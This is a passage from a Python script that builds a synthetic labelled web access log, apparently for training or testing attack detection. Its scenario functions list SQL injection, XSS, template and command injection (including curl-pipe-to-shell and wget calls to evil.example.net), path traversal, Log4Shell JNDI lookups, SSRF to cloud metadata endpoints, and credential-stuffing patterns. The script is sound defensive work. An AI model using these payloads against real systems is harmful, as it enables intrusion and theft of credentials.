             "/static/js/bundle.9ac3d1.js.map", "/.git/logs/HEAD", "/.svn/entries", "/dump.sql", "/.env.bak", "/settings.py", "/local.settings.json",
             "/api/swagger.json", "/serverless.yml", "/.gitlab-ci.yml", "/.github/workflows/deploy.yml", "/envrc", "/phpinfo"]
    t = H(2, 3)
    for p in paths:
        st = R.choices([404, 403, 200], [14, 3, 1])[0]
        if p == "/static/js/bundle.9ac3d1.js.map":
            st = 200
        log(ip, t, "GET", p, st, 512 if st == 404 else 560 if st == 403 else 4000, "-", ua)
        t += R.randint(20, 90) * 12 // 5


SQLI = ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--", "' UNION SELECT NULL,username,password FROM users--",
        "1; WAITFOR DELAY '0:0:5'--", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1 AND extractvalue(1,concat(0x7e,database()))", "1/*!50000UNION*/SELECT/**/1,2,3", "admin'--", "1' ORDER BY 10--",
        "1) OR (1=1", "'; DROP TABLE tasks;--", "1' AND 1=CAST((SELECT current_user) AS int)--", "1 AND pg_sleep(5)",
        "' OR 'x'='x", "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64", "\" OR \"\"=\"", "1' AND '1'='2"]


def m_sqli():
    ip = client(v4(), "malicious", "sqli_sqlmap")
    ua = "sqlmap/1.8.4#stable (https://sqlmap.org)"
    targets = ["/v1/search?q=", "/v1/tasks?sort=", "/app/projects?filter=", "/v1/projects?owner="]
    t = H(9, 40)
    for _ in range(150):
        p = R.choice(targets) + enc(R.choice(SQLI), R.choice(["raw", "url", "url", "plus", "dbl"]))
        st = R.choices([200, 500, 400], [5, 4, 2])[0]
        log(ip, t, "GET", p, st, R.randint(200, 3000) if st != 500 else 420, "-", ua)
        t += R.uniform(0.2, 1.4)


def m_xss():
    ip = client(v4(), "malicious", "xss_ssti_cmdi")
    ua = UA_FF_LIN
    pl = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(document.cookie)>", "<svg/onload=alert(1)>", "{{7*7}}", "${7*7}",
          "#{7*7}", "<%= 7*7 %>", "{{config.__class__.__init__.__globals__}}", ";cat /etc/passwd", "|id", "`whoami`",
          "$(curl http://evil.example.net/x|sh)", "javascript:alert(1)", "<iframe src=javascript:alert(1)>", "';alert(String.fromCharCode(88,83,83))//",
          "&& wget http://evil.example.net/b -O /tmp/b", "%0a id", "<body onload=alert(1)>", "{{''.__class__.__mro__[1].__subclasses__()}}"]
    t = H(5, 30)
    for i in range(65):
        base = R.choice(["/docs/search?q=", "/v1/export?format=csv&name=", "/app/projects/412/import?url=", "/blog?s=", "/contact?subject="])
        p = base + enc(R.choice(pl), R.choice(["raw", "url", "dbl", "plus"]))
        log(ip, t, "GET", p, R.choice([200, 200, 400, 500]), R.randint(300, 6000), "-", ua)
        t += R.randint(8, 45)


def m_traversal():
    ip = client(v4(), "malicious", "path_traversal")
    ua = "curl/8.5.0"
    ps = ["/docs/download?file=../../../../etc/passwd", "/docs/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "/docs/download?file=..%252f..%252f..%252fetc%252fpasswd", "/static/../../etc/passwd", "/static/%2e%2e/%2e%2e/etc/passwd",
          "/static/..%c0%af..%c0%afetc/passwd", "/v1/attachments/..%2f..%2f..%2fetc%2fshadow", "/app/files/....//....//....//etc/passwd",
          "/download?path=C:\\windows\\win.ini", "/download?path=..\\..\\..\\windows\\win.ini", "/static/..;/..;/WEB-INF/web.xml",
          "/docs/download?file=file:///etc/passwd", "/docs/download?file=php://filter/convert.base64-encode/resource=index",
          "/docs/download?file=/proc/self/environ", "/v1/attachments/%2e%2e/%2e%2e/%2e%2e/etc/hosts", "/static/%252e%252e/%252e%252e/etc/passwd",
          "/docs/download?file=....\\....\\....\\boot.ini", "/app/exports/../../../../../../etc/passwd%00.pdf"]
    t = H(12, 40)
    for _ in range(60):
        p = R.choice(ps)
        if R.random() < 0.4:
            p = p.replace("etc", R.choice(["etc", "var/log", "root/.ssh", "proc/self"]))
        log(ip, t, "GET", p, R.choice([400, 403, 404, 404, 200]), R.choice([512, 560, 380]), "-", ua)
        t += R.uniform(0.5, 6)


def m_jndi():
    ip = client(v4(), "malicious", "jndi_v4")
    forms = ["${jndi:ldap://%s.evil.example.net:1389/a}", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s.evil.example.net/a}",
             "${${lower:j}ndi:${lower:l}dap://%s.evil.example.net/x}", "${jndi:dns://%s.evil.example.net}",
             "${${env:NaN:-j}ndi${env:NaN:-:}ldap://%s.evil.example.net/a}", "${jndi:rmi://%s.evil.example.net:1099/obj}",
             "${${::-j}ndi:rmi://%s.evil.example.net/a}"]
    t = H(6, 15)
    for i in range(32):
        pl = R.choice(forms) % ("x%04d" % R.randint(0, 9999))
        where = R.choice(["query", "ua", "ref", "path", "query"])
        mode = R.choice(["raw", "url"])
        if where == "query":
            log(ip, t, "GET", "/v1/search?q=" + enc(pl, mode), 200, 300, "-", UA_CH_WIN)
        elif where == "ua":
            log(ip, t, "GET", R.choice(["/", "/login", "/health"]), 200, 4000, "-", pl)
        elif where == "ref":
            log(ip, t, "GET", "/login", 200, 4100, pl, UA_CH_WIN)
        else:
            log(ip, t, "GET", "/" + enc(pl, mode), 404, 512, "-", "Mozilla/5.0 zgrab/0.x")
        t += R.uniform(1, 15)
    ip = client(v6(), "malicious", "jndi_v6")
    t = H(18, 2)
    for i in range(20):
        pl = R.choice(forms) % ("v6%04d" % R.randint(0, 9999))
        log(ip, t, "GET", R.choice(["/", "/login", "/pricing"]), 200, 4000, "-", pl)
        t += R.randint(1, 20)


def m_spray():
    ip = client(v4(), "malicious", "spray_form")
    ua = UA_CH_MAC
    ref = HOST + "/login"
    t = H(0, 20)
    succ = {R.randint(30, 60), R.randint(100, 140)}
    for i in range(170):
        if i in succ:
            log(ip, t, "POST", "/login", 302, 0, ref, ua)
            log(ip, t + 2, "GET", "/app/dashboard", 200, 9100, ref, ua)
        else:
            log(ip, t, "POST", "/login", 200, 5400 + R.randint(-3, 3), ref, ua)
        t += R.randint(300, 540)
    ip = client(v6(), "malicious", "spray_token")
    ua = "python-httpx/0.27.0"
    t = H(1, 5)
    for i, n in enumerate(names(130)):
        q = "/oauth/token?grant_type=password&username=" + up.quote(n, safe="")
        if i in (40, 90):
            log(ip, t, "POST", q, 200, 412, "-", ua)
        else:
            log(ip, t, "POST", q, 401, 84, "-", ua)
        t += R.randint(240, 420)


def m_stuffing():
    ip = client(v4(), "malicious", "stuffing_form")
    ua = UA_FF_LIN
    ref = HOST + "/login"
    t = H(14, 5)
    succ = {60, 112, 170, 205}
    for i in range(230):
        if i in succ:
            log(ip, t, "POST", "/login", 302, 0, ref, ua)
            log(ip, t + 1, "GET", "/app/settings/profile", 200, 7000, ref, ua)
            log(ip, t + 2, "GET", "/app/settings/billing", 200, 6800, ref, ua)
        else:
            log(ip, t, "POST", "/login", 200, 5400 + R.randint(-15, 15), ref, ua)
        t += R.uniform(1, 3)
    ip = client(v4(), "malicious", "stuffing_token")
    ua = "okhttp/4.12.0"
    t = H(22, 10)
    succ = {70, 150, 190}
    for i in range(220):
        if i in succ:
            log(ip, t, "POST", "/oauth/token", 200, 412, "-", ua)
            log(ip, t + 1, "GET", "/v1/me", 200, 380, "-", ua)
        else:
            log(ip, t, "POST", "/oauth/token", R.choice([401, 401, 401, 400]), 84, "-", ua)
        t += R.uniform(0.5, 2)
    ip = client(v6(), "malicious", "stuffing_api_200")
    ua = "axios/1.6.7"
    t = H(4, 40)
    succ = {35, 90, 140, 200, 250}
    for i in range(260):
        if i in succ:
            log(ip, t, "POST", "/v1/auth/login", 200, 387, "-", ua)
            log(ip, t + 1, "GET", "/v1/me", 200, 380, "-", ua)
        else:
            log(ip, t, "POST", "/v1/auth/login", 200, 61, "-", ua)
        t += R.uniform(0.6, 2.5)


def m_idor():
    ip = client(v4(), "malicious", "idor_fast")
    ua = "python-requests/2.31.0"
    t = H(21, 30)
    for i in range(4000, 4250):
        st = R.choices([200, 403, 404], [5, 4, 1])[0]
        log(ip, t, "GET", "/v1/projects/%d" % i, st, {200: R.randint(500, 1500), 403: 70, 404: 64}[st], "-", ua)
        t += R.uniform(0.3, 0.9)
    for i in range(100, 200):
        st = R.choices([200, 403, 404], [5, 4, 1])[0]
        log(ip, t, "GET", "/v1/users/%d" % i, st, {200: R.randint(300, 600), 403: 70, 404: 64}[st], "-", ua)
        t += R.uniform(0.3, 0.9)
    ip = client(v4(), "malicious", "idor_slow")
    ua = UA_CH_WIN
    t = H(0, 10)
    i = 90001
    while t < 86400:
        st = R.choices([200, 403, 404], [5, 3, 1])[0]
        log(ip, t, "GET", "/app/billing/invoices/%d/pdf" % i, st, {200: R.randint(40000, 90000), 403: 560, 404: 512}[st],
            HOST + "/app/billing/invoices", ua)
        i += R.choice([1, 1, 1, 2])
        t += R.randint(360, 540)


def m_botnets():
    uas = BROWSERS + [UA_OLD_IE, "okhttp/4.9.3", "python-requests/2.28.1", "Dalvik/2.1.0 (Linux; U; Android 11; SM-A515F Build/RP1A.200720.012)",
                      "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"]
    for _ in range(80):
        ip = client(v4(), "malicious", "botnet_v4")
        t = H(15) + R.randint(0, 7200)
        ua = R.choice(uas)
        for _ in range(R.randint(3, 6)):
            if R.random() < 0.6:
                log(ip, t, "POST", "/login", 302 if R.random() < 0.05 else 200, 5400 + R.randint(-15, 15), HOST + "/login", ua)
            else:
                log(ip, t, "POST", "/oauth/token", 401, 84, "-", ua)
            t += R.randint(20, 600)
    counter = [31000]
    for _ in range(40):
        ip = client(v6("bad%x" % R.randint(0, 15)), "malicious", "botnet_v6")
        t = H(20) + R.randint(0, 5400)
        ua = R.choice(uas)
        for _ in range(R.randint(4, 6)):
            r = R.random()
            if r < 0.7:
                counter[0] += R.choice([1, 1, 1, 2])
                log(ip, t, "GET", "/v1/users/%d" % counter[0], R.choice([200, 403, 403, 404]), R.randint(64, 500), "-", ua)
            else:
                log(ip, t, "GET", R.choice(["/wp-login.php", "/xmlrpc.php"]), 404, 512, "-", ua)
            t += R.randint(30, 700)


def m_blender():
    ip = client(v4(), "malicious", "blender")
    ua = UA_CH_WIN
    t = H(11, 0)
    prev = "https://www.google.com/"
    atk = ["/app/projects?sort=name;SELECT+pg_sleep(5)--", "/docs/search?q=%27%20UNION%20SELECT%20username,password%20FROM%20users--",
           "/app/../../etc/passwd", "/v1/projects/1'%20OR%20'1'='1", "/app/admin/users", "/app/admin/", "/docs/download?file=../../../etc/passwd",
           "/blog?s=<script>alert(1)</script>", "/v1/search?q=1%27%20AND%20SLEEP(5)--", "/.env", "/app/admin/config",
           "/v1/users?filter=1%20OR%201=1", "/app/projects/412?id=1%3BDROP%20TABLE%20tasks"]
    n = 0
    for i in range(60):
        if i % 5 == 4:
            p = atk[n % len(atk)]
            n += 1
            log(ip, t, "GET", p, R.choice([403, 404, 500, 200, 400]), R.randint(300, 4000), prev, ua)
        else:
            p = R.choice(MARKETING + BLOGS + DOCS)
            load(ip, t, ua, p, prev, assets=(i % 15 == 0))
            prev = HOST + p
        t += R.randint(20, 400)


def m_ssrf():
    ip = client(v4(), "malicious", "ssrf_nosql_xxe")
    ua = "Go-http-client/1.1"
    pl = ["/v1/integrations/preview?url=" + enc(u, R.choice(["url", "raw"])) for u in
          ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://localhost:8080/admin", "http://[::1]/",
           "gopher://127.0.0.1:6379/_INFO", "file:///etc/passwd", "http://0x7f000001/", "http://2130706433/", "http://metadata.google.internal/computeMetadata/v1/"]]
    pl += ["/v1/users?filter[$ne]=null", '/v1/users?filter={"$gt":""}', "/v1/auth/login?user[$regex]=.*&pass[$ne]=1",
           "/v1/users?name=*)(uid=*))(|(uid=*", "/v1/users?name=admin)(%26)", '/v1/tasks?where={"$where":"sleep(5000)"}']
    t = H(7, 45)
    for i in range(45):
        if i % 6 == 5:
            log(ip, t, "POST", "/v1/import", R.choice([400, 500]), 220, "-", ua)
        else:
            log(ip, t, "GET", R.choice(pl), R.choice([400, 403, 500, 200]), R.randint(100, 800), "-", ua)
        t += R.randint(10, 40)


def main():
    b_users(); b_crawlers(); b_monitors(); b_ci(); b_office(); b_forgot(); b_support(); b_writer(); b_mobile(); b_misc()
    m_scanner(); m_secrets(); m_sqli(); m_xss(); m_traversal(); m_jndi(); m_spray(); m_stuffing(); m_idor(); m_botnets()
    m_blender(); m_ssrf()
    events.sort(key=lambda e: (e[0], e[1]))
    with open(os.path.join(OUT, "access.log"), "w", encoding="ascii", newline="\n") as f:
        for _, _, line in events:
            f.write(line + "\n")
    seen = {l.split(" ", 1)[0] for _, _, l in events}
    assert seen <= set(labels), seen - set(labels)
    assert set(labels) <= seen, set(labels) - seen
    with open(os.path.join(OUT, "labels.csv"), "w", encoding="ascii", newline="\n") as f:
        f.write("client_ip,label,scenario\n")
        for ip in sorted(labels, key=lambda x: (labels[x][0], labels[x][1], x)):
            f.write("%s,%s,%s\n" % (ip, labels[ip][0], labels[ip][1]))
    stats = {}
    for _, _, l in events:
        ip = l.split(" ", 1)[0]
        lab, sc = labels[ip]
        c, n = stats.get((lab, sc), (0, 0))
        stats[(lab, sc)] = (c, n + 1)
    cl = {}
    for ip, k in labels.items():
        cl[k] = cl.get(k, 0) + 1
    print("%-10s %-26s %8s %8s" % ("label", "scenario", "clients", "lines"))
    for k in sorted(cl):
        print("%-10s %-26s %8d %8d" % (k[0], k[1], cl[k], stats[k][1]))
    print("total lines", len(events), "clients", len(labels),
          "bytes", os.path.getsize(os.path.join(OUT, "access.log")))


if __name__ == "__main__":
    main()
